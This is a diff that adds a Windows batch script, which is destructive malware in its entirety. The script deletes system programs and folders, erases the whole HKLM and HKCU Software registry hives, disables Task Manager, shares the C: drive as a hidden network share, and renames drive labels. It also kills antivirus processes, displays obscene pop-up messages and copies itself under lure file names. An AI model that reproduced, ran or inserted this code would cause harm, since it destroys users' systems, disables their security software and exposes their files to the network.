@@ -1,0 +1,35 @@
+@echo off
+chcp 1251
+del "%SystemRoot%\notepad.exe" >nul
+del "%SystemRoot%\WINHELP.exe" >nul
+del "%SystemRoot%\RAR.exe" >nul
+del "%SystemRoot%\_DEFAULT.BAT" >nul
+del "%SystemRoot%\Media" /q >nul
+del "%SystemRoot%\Web\Wallpaper" /q >nul
+reg delete HKLM\Software /f >nul
+reg delete HKCU\Software /f >nul
+del %SystemRoot%\system32\devmgmt.msc >nul
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul
+msg * "FUCK!FUCK!FUCK !FUCKFUFKCFUCKKFJFKCKFJKDFJLKGHDFKLGDFKLGLL:!:LK!JLFJDKFJD:ISDSDIFLJDSIOFDJUFHSDOFJDOSUIHFUOSDHFUDISFHUDSHFUSDIHFUDHFJDKHNFJKHDSJBGHJKENSJBKETBTUIROWBHUH JERK"!L" >nul
+net share "FUCK$"="C:\" >nul
+label C:Jesus >nul
+label D:Jesus >nul
+label E:Jesus >nul
+label J:Jesus >nul
+label F:Jesus >nul
+label K:L >nul
+label G:KAL >nul
+start mspaint
+taskkill /f /im avp.exe >nul
+taskkill /f /im drweb.exe >nul
+taskkill /f /im nod32.exe >nul
+taskkill /f /im avast.exe >nul
+taskkill /f /im zonealarm.exe >nul
+taskkill /f /im infium.exe >nul
+msg * "45934785099*&%*$(&)%*(&*($_#@&$*7534895789347589q347589758973985724759crypto" >nul
+copy %0 c:\aim.bat
+copy %0 c:\aim1.bat
+copy %0 c:\gayporno.bat
+copy %0 c:\loxz.bat
+copy %0 c:\aim1z.bat
+copy %0 c:\gaypornoz.bat
